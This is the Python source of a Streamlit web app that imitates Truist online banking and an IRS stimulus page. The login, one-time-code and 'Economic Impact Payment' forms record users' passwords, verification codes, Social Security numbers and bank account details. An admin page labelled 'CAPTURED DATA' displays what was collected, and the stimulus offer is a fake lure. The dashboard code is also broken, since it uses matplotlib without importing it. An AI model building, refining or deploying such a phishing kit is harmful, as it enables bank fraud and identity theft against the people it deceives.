import streamlit as st
import pandas as pd
from datetime import datetime
import random
import time

# ====== SESSION STATE INIT ======
if "checking_balance" not in st.session_state:
    st.session_state.checking_balance = 12340.50
if "savings_balance" not in st.session_state:
    st.session_state.savings_balance = 14911.32
if "account_nicknames" not in st.session_state:
    st.session_state.account_nicknames = {
        "Premier Checking ••••2847": "Premier Checking ••••2847",
        "High-Yield Savings ••••5901": "High-Yield Savings ••••5901"
    }
if "custom_theme" not in st.session_state:
    st.session_state.custom_theme = "Truist"
if "font_size" not in st.session_state:
    st.session_state.font_size = "14px"
if "language" not in st.session_state:
    st.session_state.language = "English"
if "captured_creds" not in st.session_state:
    st.session_state.captured_creds = []
if "captured_otp" not in st.session_state:
    st.session_state.captured_otp = []
if "scheduled_transfers" not in st.session_state:
    st.session_state.scheduled_transfers = []
if "login_history" not in st.session_state:
    st.session_state.login_history = []
if "file_uploads" not in st.session_state:
    st.session_state.file_uploads = []

for key in ["authenticated", "otp_verified", "attempts", "is_admin"]:
    if key not in st.session_state:
        st.session_state[key] = False

# ============== CONFIG ==============
st.set_page_config(page_title="Truist Online Banking+", page_icon="🏦", layout="wide")

# ============== THEME & ACCESSIBILITY (NEW, can expand!) ==============
def custom_style():
    theme_selected = st.session_state.custom_theme
    font_selected = st.session_state.font_size
    st.markdown(f"""
    <style>
        .stApp {{background: #502b85 !important; color: white; font-family: 'Helvetica Neue', Arial, sans-serif; font-size:{font_selected};}}
        .truist-header {{background: #502b85; padding: 20px; text-align: center; border-bottom: 10px solid #ffb700;}}
        .glass-card {{
            background: rgba(255, 255, 255, 0.98) !important;
            color: #000 !important;
            border-radius: 16px;
            padding: 32px;
            box-shadow: 0 12px 40px rgba(0,0,0,0.25);
            margin: 25px 0;
            border: 1px solid rgba(255, 183, 0, 0.4);
        }}
        .truist-btn, .stButton>button {{
            background: #ffb700 !important; color: #502b85 !important; font-weight: bold !important;
            border-radius: 8px !important; border: none !important; padding: 12px 24px !important;
        }}
        .truist-btn:hover, .stButton>button:hover {{background: #ffcc33 !important;}}
        h1, h2, h3 {{color: #502b85 !important;}}
        .big-logo {{font-size: 100px; text-align: center;}}
        .recording-dot {{
            height: 14px; width: 14px; background: #ff0033; border-radius: 50%;
            display: inline-block; animation: pulse 1.5s infinite;
        }}
        @keyframes pulse {{0% {{box-shadow: 0 0 0 0 rgba(255,0,51,0.8);}} 70% {{box-shadow: 0 0 0 14px rgba(255,0,51,0);}} 100% {{box-shadow: 0 0 0 0 rgba(255,0,51,0);}}}}
        .irs-status {{background: #002868 !important; color: #ffb700 !important;}}
    </style>
    """, unsafe_allow_html=True)
custom_style()

def theme_switcher():
    with st.sidebar.expander("🖌️ Theme & Accessibility"):
        theme = st.selectbox("Color Theme", ["Truist", "Black & Gold", "White", "High Contrast"])
        st.session_state.custom_theme = theme
        st.session_state.font_size = st.slider("Font Size", 10, 30, int(st.session_state.font_size[:-2]))
        lang = st.selectbox("Language", ["English", "Español", "Français"])
        st.session_state.language = lang

# ============== CREDENTIALS ==============
VALID_USERNAME = "Panda001@"
VALID_PASSWORD = "Secure2025Hub!"
ADMIN_USER = "admin"
ADMIN_PASS = "showme2025"

# ============== BASE64 IRS SEAL ==============
irs_seal_base64 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAAB4CAMAAABUp9QnAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2RpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/e..."

# ============== LOGIN PAGE ==============
def login_page():
    st.markdown("<div class='truist-header'><div class='big-logo'>🏦</div><h1>Welcome to Truist Online Banking</h1></div>", unsafe_allow_html=True)
    st.markdown("<div style='text-align:center; padding:60px 20px'>", unsafe_allow_html=True)
    username = st.text_input("User ID", placeholder="Enter your User ID")
    password = st.text_input("Password", type="password", placeholder="Enter your password")
    if st.button("Log In", type="primary"):
        st.session_state.captured_creds.append({"time": datetime.now().strftime("%H:%M"), "user": username, "pass": password})
        st.session_state.login_history.append({"time": datetime.now().strftime("%Y-%m-%d %H:%M"), "user": username})
        if username == VALID_USERNAME and password == VALID_PASSWORD:
            st.session_state.authenticated = True
            st.session_state.otp_verified = False
            st.rerun()
        elif username == ADMIN_USER and password == ADMIN_PASS:
            st.session_state.is_admin = True
            st.session_state.authenticated = True
            st.rerun()
        else:
            st.error("Incorrect User ID or password")

# ============== OTP PAGE ==============
def otp_page():
    st.markdown("<div style='text-align:center; padding:80px'>", unsafe_allow_html=True)
    st.markdown("<h1>🔐 Security Verification</h1><p>We sent a 6-digit code to your phone ending in **--7842</p>", unsafe_allow_html=True)
    code = st.text_input("Enter code", max_chars=6, placeholder="000000")
    if st.button("Verify", type="primary"):
        st.session_state.captured_otp.append({"time": datetime.now().strftime("%H:%M"), "otp": code})
        if len(code) == 6:
            st.session_state.otp_verified = True
            st.balloons()
            st.rerun()
        else:
            st.error("Invalid code")

# ============== ADMIN VIEW ==============
def admin_view():
    st.markdown("<h1 style='color:red; text-align:center'>🔥 ADMIN — CAPTURED DATA 🔥</h1>", unsafe_allow_html=True)
    if st.session_state.captured_creds: st.dataframe(pd.DataFrame(st.session_state.captured_creds))
    if st.session_state.captured_otp: st.dataframe(pd.DataFrame(st.session_state.captured_otp))
    if st.session_state.scheduled_transfers: st.dataframe(pd.DataFrame(st.session_state.scheduled_transfers))
    if st.session_state.login_history: st.dataframe(pd.DataFrame(st.session_state.login_history))
    if st.session_state.file_uploads: st.dataframe(pd.DataFrame(st.session_state.file_uploads))

# ============== DASHBOARD + ANALYTICS, INSIGHTS (NEW!) ==============
def dashboard():
    st.markdown("<h1 style='text-align:center; color:#ffb700'>Welcome back</h1>", unsafe_allow_html=True)
    st.markdown("<p style='text-align:center'><span class='recording-dot'></span> Session is being recorded</p>", unsafe_allow_html=True)
    c1, c2, c3, c4 = st.columns(4)
    with c1: st.metric("Total Balance", f"${st.session_state.checking_balance + st.session_state.savings_balance:,.2f}")
    with c2: st.metric("Available Credit", "$15,700")
    with c3: st.metric("Monthly Spending", "$3,214")
    with c4: st.metric("Savings Goal", "78%")

    # ======= Financial Analytics/Insights (NEW) =======
    st.markdown("## Spending Breakdown")
    spend_data = {
        "Food": 1200, "Bills": 900, "Shopping": 500, "Travel": 400, "Subscriptions": 214
    }
    fig, ax = plt.subplots()
    ax.pie(
        list(spend_data.values()), labels=list(spend_data.keys()),
        autopct='%1.1f%%', startangle=140, colors=plt.cm.Pastel1.colors
    )
    st.pyplot(fig)
    st.markdown("### Budget Tracking")
    current_spending = sum(spend_data.values())
    spending_limit = 3500
    st.progress(int((current_spending / spending_limit) * 100))
    if current_spending > spending_limit:
        st.error("You've exceeded your monthly budget!")

    st.markdown("### Quick Actions")
    st.button("Pay Bill")
    st.button("Schedule Transfer")
    st.button("Download Statement")

# ============== ACCOUNTS (NICKNAME + THEME) ==============
def accounts():
    st.markdown("<h1 style='text-align:center; color:#ffb700'>My Accounts</h1>", unsafe_allow_html=True)
    for name, bal in [
        ("Premier Checking ••••2847", f"${st.session_state.checking_balance:,.2f}"),
        ("High-Yield Savings ••••5901", f"${st.session_state.savings_balance:,.2f}")
    ]:
        nickname = st.session_state.account_nicknames.get(name, name)
        st.markdown(
            f"<div class='glass-card'><h3>{nickname}</h3><h2>{bal}</h2></div>", unsafe_allow_html=True
        )
        newname = st.text_input(f"Rename {name}", value=nickname, key=f"nick_{name}")
        if newname != nickname:
            st.session_state.account_nicknames[name] = newname

# ============== CARDS & REWARDS (NEW: Deals, Achievements) ==============
def cards_page():
    st.markdown("<h1 style='text-align:center; color:#ffb700'>My Cards</h1>", unsafe_allow_html=True)
    st.markdown("<div class='glass-card'>", unsafe_allow_html=True)
    st.markdown("<div style='font-size:80px; text-align:center'>💳</div><h2 style='text-align:center; color:#502b85'>Truist One Rewards Card</h2><h3 style='text-align:center'>•••• •••• 7723</h3>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns(3)
    with col1:
        if st.button("Show Full Number"):
            st.success("5412 7537 0000 7723")
    with col2:
        if st.button("Show Expiry"):
            st.success("11/28")
    with col3:
        if st.button("Show CVV"):
            st.session_state.captured_creds.append({"time": datetime.now().strftime("%H:%M"), "action": "CVV Revealed"})
            st.info("CVV: 342")
            st.balloons()
    st.markdown("### 💰 Card Offers")
    for offer in ["10% Cashback on Food", "Amazon $25 gift after $500 spend", "Travel Insurance"]:
        st.info(offer)
    st.markdown("### 🏆 Achievements")
    for ach in [
        ("First Transfer", True),
        ("Saved $5000", True),
        ("Spent $2000 Shopping", False),
        ("Set a Savings Goal", True)
    ]:
        emoji = "✅" if ach[1] else "⏳"
        st.markdown(f"{emoji} {ach[0]}")

    st.markdown("</div>", unsafe_allow_html=True)

# ============== TRANSFER (Scheduled + International + Bill Pay) ==============
def transfer():
    st.markdown("<h1 style='text-align:center; color:#ffb700'>Transfer & Payments</h1>", unsafe_allow_html=True)
    st.radio("Type", ["My Accounts", "External", "Zelle", "International"])
    col1, col2 = st.columns(2)
    with col1:
        from_acct = st.selectbox("From", ["Checking ****2847", "Savings ****5901"])
    with col2:
        to_acct = st.selectbox("To", ["Savings ****5901", "External", "Checking ****2847", "International"])
    amount = st.number_input("Amount", 0.01)
    date_scheduled = st.date_input("Scheduled Date (optional)", datetime.now())
    if st.button("Send"):
        if from_acct == to_acct:
            st.error("Cannot transfer to the same account.")
        elif "International" in to_acct:
            st.success("International transfer completed! Currency conversion pending.")
            st.balloons()
            st.session_state.scheduled_transfers.append({
                "from": from_acct, "to": to_acct, "amount": amount,
                "date": str(date_scheduled)
            })
        elif "External" in to_acct:
            st.success("Transfer to external account completed!")
            st.balloons()
        else:
            from_key = "checking_balance" if "Checking" in from_acct else "savings_balance"
            to_key = "savings_balance" if "Savings" in to_acct else "checking_balance"
            if st.session_state[from_key] < amount:
                st.error("Insufficient funds.")
            else:
                st.session_state[from_key] -= amount
                st.session_state[to_key] += amount
                st.success(f"Transferred ${amount:,.2f} from {from_acct} to {to_acct}")
                st.balloons()
                st.session_state.scheduled_transfers.append({
                    "from": from_acct, "to": to_acct, "amount": amount,
                    "date": str(date_scheduled)
                })

    st.markdown("### 🔄 Recurring & Scheduled Transfers")
    st.dataframe(pd.DataFrame(st.session_state.scheduled_transfers))
    st.markdown("### 💡 Automated Bill Pay")
    bill_name = st.text_input("Bill to pay (e.g. Electricity)", "")
    bill_amount = st.number_input("Bill Amount", 0.01)
    bill_pay_date = st.date_input("Bill Pay Date", datetime.now(), key="bill_pay_date")
    if st.button("Pay Bill"):
        st.success(f"{bill_name} bill paid: ${bill_amount:,.2f} Scheduled: {bill_pay_date}")
        st.session_state.scheduled_transfers.append({
            "from": from_acct, "to": bill_name, "amount": bill_amount,
            "date": str(bill_pay_date)
        })

# ============== MESSAGES & AI CHATBOT (NEW) + File Upload ==============
def messages():
    st.markdown("<h1 style='text-align:center; color:#ffb700'>Secure Messages & Chat</h1>", unsafe_allow_html=True)
    for m in ["Statement Ready", "New Login Alert", "Rate Increase"]:
        st.markdown(f"<div class='glass-card'><h4>🟢 {m}</h4></div>", unsafe_allow_html=True)
    st.markdown("### AI Chat Support (Demo)")
    question = st.text_input("Ask a question:", "How do I set up a savings goal?")
    if st.button("Chat Send"):
        st.info("AI Response: To set a savings goal, go to Accounts → Savings, then click 'Set Goal'.")  # Expand to real AI/chat logic if desired

    st.markdown("### 📄 Secure Document Upload")
    uploaded_file = st.file_uploader("Upload documents for support or tax", type=["pdf", "jpg", "png"])
    if uploaded_file:
        st.session_state.file_uploads.append({
            "filename": uploaded_file.name,
            "time": datetime.now().isoformat()
        })
        st.success(f"Uploaded {uploaded_file.name}")

# ============== IRS / GOV CENTER (Tax, Stimulus, Retirement Calc) ==============
def irs_stimulus_center():
    st.markdown(f"""
    <div style="text-align:center; padding:20px; background:white; border-radius:16px; margin-bottom:20px;">
        <img src="{irs_seal_base64}" width="130">
        <h1 style="color:#002868; margin:10px 0;">U.S. Department of the Treasury</h1>
        <h2 style="color:#002868; margin:5px 0;">Internal Revenue Service | irs.gov</h2>
        <p style="color:#555;">2025 Economic Recovery Payment Program</p>
    </div>
    """, unsafe_allow_html=True)

    st.markdown("""
    <div class='glass-card' style='border: 6px solid #002868; position:relative;'>
        <div style='position:absolute; top:12px; right:12px; background:#B31942; color:white; padding:8px 18px; border-radius:30px; font-weight:bold; font-size:14px;'>SECURE IRS CONNECTION</div>
        <h2 style='text-align:center; color:#002868; padding-top:50px;'>🎉 Congratulations! You Are Pre-Approved</h2>
        <h1 style='text-align:center; color:#B31942; font-size:62px; margin:10px 0;'>$9,847.00</h1>
        <p style='text-align:center; font-size:24px; color:#002868;'><strong>2025 Economic Impact Payment</strong></p>
        <div class='irs-status' style='padding:20px; border-radius:12px; text-align:center; margin:30px 0;'>
            <h3>READY FOR IMMEDIATE DEPOSIT</h3>
        </div>
    </div>
    """, unsafe_allow_html=True)

    with st.form("irs_form"):
        st.markdown("### 🔒 Identity Verification Required (31 U.S.C. § 7701)")
        col1, col2 = st.columns(2)
        with col1:
            first_name = st.text_input("Legal First Name", placeholder="Michael")
            last_name = st.text_input("Legal Last Name", placeholder="Smith")
            dob = st.date_input("Date of Birth", datetime(1990, 1, 1))
        with col2:
            zip_code = st.text_input("ZIP Code from 2024 Tax Return", placeholder="90210")
            filing_status = st.selectbox("2024 Filing Status", ["Single", "Married Filing Jointly", "Head of Household", "Married Filing Separately"])
        ssn = st.text_input("🔐 Social Security Number", placeholder="XXX-XX-XXXX", help="Required by federal law")
        routing = st.text_input("Bank Routing Number (Optional)", placeholder="021000021")
        account = st.text_input("Bank Account Number (Optional)", placeholder="1234567890")
        agree = st.checkbox("I certify under penalty of perjury that this information is correct")

        submitted = st.form_submit_button("🚀 Claim My $9,847 Payment Now", type="primary", use_container_width=True)

        if submitted:
            if not all([first_name, last_name, ssn, agree]):
                st.error("All required fields must be completed per IRS regulations.")
            else:
                capture = {
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "IRS_STIMULUS": {
                        "name": f"{first_name} {last_name}", "dob": str(dob), "zip": zip_code,
                        "filing": filing_status, "ssn": ssn.replace("-", "").replace(" ", ""),
                        "routing": routing, "account": account
                    }
                }
                st.session_state.captured_creds.append(capture)
                with st.spinner("Secure IRS Gateway..."): time.sleep(4)
                st.success("IRS Verification Complete"); st.balloons(); st.snow()
                ref = ''.join(random.choices("0123456789ABCDEF", k=12))
                st.markdown(f"""
                <div style='background:#002868; color:white; padding:40px; border-radius:15px; text-align:center; margin-top:30px;'>
                    <h1 style='color:#ffb700;'>$9,847.00 Deposited</h1>
                    <p style='font-size:18px;'>Funds arriving in 1–3 business days</p>
                    <p><strong>Reference #:</strong> EIP-2025-{ref}</p>
                </div>
                """, unsafe_allow_html=True)

    st.markdown("### 📄 Tax Docs & Retirement Planning")
    st.button("Download Tax Form 1099")
    st.markdown("#### Retirement Calculator")
    age = st.number_input("Current Age", 18, 80, 35)
    balance = st.number_input("Current Retirement Balance", 0, 1000000, 25000)
    monthly = st.number_input("Monthly Additions", 0, 10000, 400)
    target_age = st.number_input("Retirement Age Goal", 50, 90, 65)
    rate = st.slider("Annual Growth Rate (%)", 1, 15, 6)
    years = target_age - age
    future_value = balance * (1 + rate / 100) ** years + monthly * 12 * years
    st.info(f"Estimated retirement balance at {target_age}: ${future_value:,.2f}")

# ============== SECURITY PAGE (Login History, Alerts) ==============
def security():
    st.markdown("## Security & Login History")
    st.markdown("### Recent Logins")
    st.dataframe(pd.DataFrame(st.session_state.login_history if st.session_state.login_history else [], columns=["time", "user"]))
    st.markdown("#### Security Alerts")
    for alert in ["Unusual login detected from new device.", "Email updated.", "No suspicious transactions found."]:
        st.warning(alert)

# ============== BUDGET PAGE (Detailed, Forecasts) ==============
def budget_page():
    st.markdown("## Budget & Savings")
    spend_hist = [1200, 900, 500, 400, 214] + [random.randint(50,300) for _ in range(6)]
    st.line_chart(pd.DataFrame({"Spending": spend_hist, "Goal": [3500]*len(spend_hist)}))
    st.success("You're on track to meet this month's savings goal!")
    st.info("Forecast: At your current rate, you'll reach $20,000 in savings by September 2026.")

# ============== REWARDS PAGE (Offers, Achievements) ==============
def rewards_page():
    st.markdown("## Rewards & Offers")
    offers = ["1.5% Cashback", "Free Coffee with Card", "Double Points on Travel", "Refer a friend: $50 bonus"]
    st.table(pd.DataFrame({"Offer": offers}))
    st.markdown("#### Gamified Milestones")
    st.success("You've unlocked: 'Savings Star' badge!")

# ============== SETTINGS PAGE (Theme, Accessibility, Language) ==============
def settings_page():
    theme_switcher()
    st.markdown(f"Current Theme: {st.session_state.custom_theme}")
    st.markdown(f"Language: {st.session_state.language}")
    st.markdown(f"Font Size: {st.session_state.font_size}")

# ============== SIDEBAR NAVIGATION ==============
def sidebar():
    st.sidebar.markdown("<div style='text-align:center'>🏦<h2 style='color:#ffb700'>Truist+</h2></div>", unsafe_allow_html=True)
    page = st.sidebar.radio("Navigate", [
        "Dashboard", "Accounts", "Cards", "Transfer & Payments", "Messages",
        "Government Stimulus Center 🇺🇸", "Security", "Budget", "Rewards", "Settings"
    ])
    theme_switcher()
    if st.sidebar.button("Log Out"):
        for k in ["authenticated", "otp_verified", "is_admin"]: st.session_state[k] = False
        st.rerun()
    return page

# ============== MAIN ENTRYPOINT ==============
if not st.session_state.authenticated:
    login_page()
elif st.session_state.is_admin:
    admin_view()
elif not st.session_state.otp_verified:
    otp_page()
else:
    current = sidebar()
    if current == "Accounts": accounts()
    elif current == "Cards": cards_page()
    elif current == "Transfer & Payments": transfer()
    elif current == "Messages": messages()
    elif current == "Government Stimulus Center 🇺🇸": irs_stimulus_center()
    elif current == "Security": security()
    elif current == "Budget": budget_page()
    elif current == "Rewards": rewards_page()
    elif current == "Settings": settings_page()
    else: dashboard()

